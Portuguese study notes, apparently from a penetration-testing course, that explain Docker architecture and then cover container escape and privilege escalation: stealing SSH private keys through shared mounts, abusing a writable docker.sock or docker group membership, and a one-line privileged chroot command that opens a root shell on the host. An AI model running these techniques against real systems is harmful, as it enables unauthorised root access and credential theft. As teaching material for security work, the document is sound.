# Docker

Docker é uma ferramenta open-source popular que fornece um ambiente de execução portátil e consistente para aplicações. Ele usa containers como ambientes isolados em espaço de usuário, que rodam no nível do sistema operacional e compartilham o sistema de arquivos e os recursos do sistema. Uma vantagem é que a conteinerização consome significativamente menos recursos do que um servidor tradicional ou uma máquina virtual. A característica central do Docker é que as aplicações são encapsuladas nos chamados containers Docker. Assim, elas podem ser usadas em qualquer sistema operacional. Um container Docker representa um pacote de software executável, leve e independente, que contém tudo o que é necessário para rodar o código de uma aplicação em tempo de execução.

## Arquitetura do Docker

No núcleo da arquitetura do Docker está um modelo cliente-servidor, onde temos dois componentes principais:

- O Docker daemon
- O Docker client

O Docker client atua como nossa interface para emitir comandos e interagir com o ecossistema Docker, enquanto o Docker daemon é responsável por executar esses comandos e gerenciar os containers.

## Docker Daemon

O Docker Daemon, também conhecido como Docker server, é uma parte crítica da plataforma Docker que desempenha um papel fundamental no gerenciamento e na orquestração de containers. Pense no Docker Daemon como o motor por trás do Docker. Ele tem várias responsabilidades essenciais, como:

- executar containers Docker
- interagir com containers Docker
- gerenciar containers Docker no sistema host

### Gerenciando Containers Docker

Primeiramente, ele lida com a funcionalidade central de conteinerização. Ele coordena a criação, execução e monitoramento de containers Docker, mantendo seu isolamento em relação ao host e a outros containers. Esse isolamento garante que os containers operem de forma independente, com seus próprios sistemas de arquivos, processos e interfaces de rede. Além disso, ele gerencia as imagens Docker: puxa imagens de registries, como o Docker Hub ou repositórios privados, e as armazena localmente. Essas imagens servem como blocos de construção para a criação de containers.

Adicionalmente, o Docker Daemon oferece recursos de monitoramento e logging, por exemplo:

- Captura logs dos containers
- Fornece visibilidade sobre atividades dos containers, erros e informações de depuração

O Daemon também monitora o uso de recursos, como CPU, memória e rede, permitindo otimizar o desempenho dos containers e solucionar problemas.

### Rede e Armazenamento

Ele facilita a rede dos containers, criando redes virtuais e gerenciando interfaces de rede. Isso permite que os containers se comuniquem entre si e com o mundo externo através de portas de rede, endereços IP e resolução DNS. O Docker Daemon também desempenha um papel crítico no gerenciamento de armazenamento, pois lida com os volumes Docker, usados para persistir dados além do ciclo de vida dos containers, gerenciando a criação, o anexo e a limpeza de volumes, permitindo que os containers compartilhem ou armazenem dados de forma independente uns dos outros.

## Docker Clients

Quando interagimos com o Docker, emitimos comandos através do Docker Client, que se comunica com o Docker Daemon (através de uma API RESTful ou de um socket Unix) e serve como nosso principal meio de interação com o Docker. Também temos a capacidade de criar, iniciar, parar, gerenciar, remover containers, buscar e baixar imagens Docker. Com essas opções, podemos puxar imagens existentes para usar como base para nossos containers, ou construir nossas próprias imagens customizadas usando Dockerfiles. Temos a flexibilidade de enviar (push) nossas imagens para repositórios remotos, facilitando a colaboração e o compartilhamento dentro de nossas equipes ou com a comunidade em geral.

Em comparação, o Daemon, por sua vez, executa as ações solicitadas, garantindo que os containers sejam criados, iniciados, parados e removidos conforme necessário.

Outro client para o Docker é o Docker Compose. É uma ferramenta que simplifica a orquestração de múltiplos containers Docker como uma única aplicação. Ela permite definir a arquitetura multi-container da nossa aplicação usando um arquivo YAML declarativo (.yaml/.yml). Com ele, podemos especificar os serviços que compõem nossa aplicação, suas dependências e suas configurações. Definimos imagens de container, variáveis de ambiente, rede, bindings de volume e outras configurações. O Docker Compose então garante que todos os containers definidos sejam iniciados e interconectados, criando uma stack de aplicação coesa e escalável.

## Docker Desktop

O Docker Desktop está disponível para MacOS, Windows e Linux e nos fornece uma GUI amigável que simplifica o gerenciamento de containers e seus componentes. Isso nos permite monitorar o status dos nossos containers, inspecionar logs e gerenciar os recursos alocados ao Docker. Ele fornece uma forma intuitiva e visual de interagir com o ecossistema Docker, tornando-o acessível a desenvolvedores de todos os níveis de experiência, além de oferecer suporte a Kubernetes.

## Imagens e Containers Docker

Pense em uma imagem Docker como um blueprint ou template para a criação de containers. Ela encapsula tudo o que é necessário para rodar uma aplicação, incluindo o código da aplicação, dependências, bibliotecas e configurações. Uma imagem é um pacote autocontido e somente leitura, que garante consistência e reprodutibilidade em diferentes ambientes. Podemos criar imagens usando um arquivo de texto chamado Dockerfile, que define os passos e instruções para construir a imagem.

Um container Docker é uma instância de uma imagem Docker. É um ambiente leve, isolado e executável que roda aplicações. Quando iniciamos um container, ele é criado a partir de uma imagem específica, e o container herda todas as propriedades e configurações definidas nessa imagem. Cada container opera de forma independente, com seu próprio sistema de arquivos, processos e interfaces de rede. Esse isolamento garante que as aplicações dentro dos containers permaneçam separadas do sistema host subjacente e de outros containers, evitando conflitos e interferências.

Enquanto as imagens são imutáveis e somente leitura, os containers são mutáveis e podem ser modificados durante a execução. Podemos interagir com containers, executar comandos dentro deles, monitorar seus logs e até fazer alterações em seu sistema de arquivos ou ambiente. No entanto, quaisquer modificações feitas no sistema de arquivos de um container não são persistidas, a menos que sejam explicitamente salvas como uma nova imagem ou armazenadas em um volume persistente.

## Escalação de Privilégios via Docker

Pode acontecer de obtermos acesso a um ambiente onde encontramos usuários que podem gerenciar containers Docker. Com isso, podemos procurar formas de usar esses containers Docker para obter privilégios mais altos no sistema alvo. Podemos usar várias formas e técnicas para escalar nossos privilégios ou escapar do container Docker.

### Diretórios Compartilhados do Docker

Ao usar o Docker, diretórios compartilhados (montagens de volume) podem preencher a lacuna entre o sistema host e o sistema de arquivos do container. Com diretórios compartilhados, diretórios ou arquivos específicos do sistema host podem se tornar acessíveis dentro do container. Isso é extremamente útil para persistir dados, compartilhar código e facilitar a colaboração entre ambientes de desenvolvimento e containers Docker. No entanto, isso sempre depende da configuração do ambiente e dos objetivos que os administradores desejam alcançar. Para criar um diretório compartilhado, é especificado um caminho no sistema host e um caminho correspondente dentro do container, criando um link direto entre os dois locais.

Diretórios compartilhados oferecem várias vantagens, incluindo a capacidade de persistir dados além do ciclo de vida de um container, simplificar o compartilhamento de código e o desenvolvimento, e possibilitar a colaboração dentro de equipes. É importante notar que diretórios compartilhados podem ser montados como somente leitura ou leitura-escrita, dependendo dos requisitos específicos do administrador. Quando montado como somente leitura, modificações feitas dentro do container não afetarão o sistema host, o que é útil quando se prefere acesso somente leitura para evitar modificações acidentais.

Quando obtemos acesso ao container Docker e o enumeramos localmente, podemos encontrar diretórios adicionais (não padrão) no sistema de arquivos do Docker.

```shellsession
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir daqui, poderíamos copiar o conteúdo da chave SSH privada para um arquivo `cry0l1t3.priv` e usá-la para logar como o usuário `cry0l1t3` no sistema host.

```shellsession
JLMreal@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

### Sockets do Docker

Um socket Docker (ou Docker daemon socket) é um arquivo especial que nos permite, a nós e a outros processos, comunicar com o Docker daemon. Essa comunicação ocorre através de um socket Unix ou de um socket de rede, dependendo da configuração do nosso setup Docker. Ele atua como uma ponte, facilitando a comunicação entre o Docker client e o Docker daemon. Quando emitimos um comando através da CLI do Docker, o Docker client envia o comando para o Docker socket, e o Docker daemon, por sua vez, processa o comando e executa as ações solicitadas.

Ainda assim, os sockets Docker exigem permissões apropriadas para garantir uma comunicação segura e evitar acesso não autorizado. O acesso ao Docker socket é tipicamente restrito a usuários ou grupos de usuários específicos, garantindo que apenas indivíduos confiáveis possam emitir comandos e interagir com o Docker daemon. Ao expor o Docker socket através de uma interface de rede, podemos gerenciar hosts Docker remotamente, emitir comandos e controlar containers e outros recursos. Esse acesso remoto via API expande as possibilidades para setups Docker distribuídos e cenários de gerenciamento remoto. No entanto, dependendo da configuração, há várias formas em que processos automatizados ou tarefas podem ser armazenados. Esses arquivos podem conter informações muito úteis para nós, que podemos usar para escapar do container Docker.

```shellsession
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

A partir daqui, podemos usar o binário `docker` para interagir com o socket e enumerar quais containers Docker já estão em execução. Se não estiver instalado, podemos baixá-lo e enviá-lo para o container Docker.

```shellsession
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

Podemos criar nosso próprio container Docker que mapeia o diretório raiz do host (`/`) para o diretório `/hostsystem` no container. Com isso, teremos acesso total ao sistema host. Portanto, devemos mapear esses diretórios adequadamente e usar a imagem Docker `main_app`.

```shellsession
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Agora, podemos logar no novo container privilegiado com o ID `7ae3bcc818af` e navegar até `/hostsystem`.

```shellsession
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir daí, podemos novamente tentar pegar a chave SSH privada e logar como root ou como qualquer outro usuário no sistema com uma chave SSH privada em sua pasta.

### Grupo Docker

Para obter privilégios de root através do Docker, o usuário com o qual estamos logados precisa estar no grupo `docker`. Isso permite que ele use e controle o Docker daemon.

```shellsession
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternativamente, o Docker pode ter o SUID configurado, ou podemos estar no arquivo Sudoers, o que nos permite rodar o `docker` como root. Todas as três opções nos permitem trabalhar com o Docker para escalar nossos privilégios.

A maioria dos hosts tem conexão direta com a internet, porque as imagens base e os containers precisam ser baixados. No entanto, muitos hosts podem ficar desconectados da internet à noite e fora do horário de trabalho, por motivos de segurança. Contudo, se esses hosts estiverem em uma rede pela qual, por exemplo, um servidor web precisa passar, ainda é possível alcançá-los.

Para ver quais imagens existem e quais podemos acessar, podemos usar o seguinte comando:

```shellsession
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

### Docker Socket

Um caso que também pode ocorrer é quando o Docker socket está com permissão de escrita (writable). Normalmente, esse socket está localizado em `/var/run/docker.sock`. No entanto, o local pode obviamente ser diferente. Porque, basicamente, ele só pode ser escrito pelo root ou pelo grupo docker. Se agirmos como um usuário que não está em nenhum desses dois grupos, e o Docker socket ainda assim tiver permissão de escrita, ainda podemos usar esse caso para escalar nossos privilégios.

```shellsession
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```

---

## Variação prática: `run` interativo com chroot em um único comando

Uma alternativa mais direta ao fluxo acima (criar em background com `-d`, listar com `ps`, depois `exec`) é já nascer com o shell interativo e o chroot aplicado, tudo em um único comando:

```bash
docker -H unix:///run/docker.sock run --rm -it --privileged -v /:/hostsystem ubuntu chroot /hostsystem bash
```

**Por que essa forma funciona onde a versão em background falha:**

Se você rodar o container sem `-it` e sem um comando que "segure" o processo (ex.: só `run -d ... ubuntu`, sem `CMD`), o container executa o `bash` padrão da imagem `ubuntu`. Só que, sem TTY nem stdin conectados, o `bash` não tem o que processar, recebe EOF imediatamente e sai — o container entra em `Exited (0)` em frações de segundo. Se `--rm` estiver presente, ele some do `ps -a`; sem `--rm`, ele fica listado, mas parado, e um `docker exec` nele falha com `Container ... is not running`.

A flag `-it` resolve isso: `-i` mantém o stdin aberto, `-t` aloca um pseudo-TTY. Com terminal e entrada interativa disponíveis, o processo principal do container (nesse caso, o `bash` chamado via `chroot`) fica vivo esperando comandos, em vez de terminar sozinho.

O `chroot /hostsystem bash` no final substitui o `CMD` padrão da imagem. Em vez de rodar um `bash` isolado dentro do container (que só enxergaria `/hostsystem` como mais um diretório montado), o `chroot` troca a raiz (`/`) do processo para `/hostsystem` **antes** de iniciar o `bash`. Como `/hostsystem` é o `/` real do host (montado via `-v /:/hostsystem`), o `bash` resultante já nasce "pensando" que está rodando na raiz do host — sem precisar de `cd` manual nem de um segundo `exec`.

Resumindo o fluxo completo em um comando só:

1. `run --rm -it` → cria o container, garante que ele não morre sozinho e que é removido ao sair
2. `--privileged` → remove as restrições de isolamento (capabilities, seccomp, AppArmor/SELinux, acesso a devices)
3. `-v /:/hostsystem` → monta o `/` do host dentro do container, em `/hostsystem`
4. `ubuntu` → imagem base, só precisa ter o binário `chroot` disponível
5. `chroot /hostsystem bash` → troca a raiz do processo para o filesystem do host e já entrega o shell nele

O resultado é o mesmo objetivo do exemplo do `id_rsa` visto antes (ler `/hostsystem/root/.ssh/id_rsa`, `/etc/shadow`, plantar chaves SSH, etc.), só que sem precisar dos passos intermediários de `ps` e `exec` — tudo cai direto em um shell root no filesystem do host.
